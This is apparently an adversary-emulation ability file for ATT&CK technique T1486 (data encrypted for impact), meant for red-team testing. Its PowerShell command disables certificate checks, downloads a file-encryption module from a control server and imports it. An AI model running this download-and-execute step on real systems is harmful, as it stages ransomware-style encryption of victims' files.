---

- id: 0353934b-a398-41bb-b55a-7db64dd575ca
  name: Install cryptography
  description: Install a module for encrypting files
  tactic: impact
  technique:
    attack_id: T1486
    name: Data Encrypted for Impact
  executors:
    windows:
      command: |
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};
        $url="#{server}/file/download";
        $wc=New-Object System.Net.WebClient;
        $wc.Headers.add("file","FileCryptography.psm1");
        $output="C:\Users\Public\FileCryptography.psm1";
        $wc.DownloadFile($url,$output);
        Import-Module C:\Users\Public\FileCryptography.psm1 -Verbose -Force;
      cleanup: |
        Remove-Item C:\Users\Public\FileCryptography.psm1
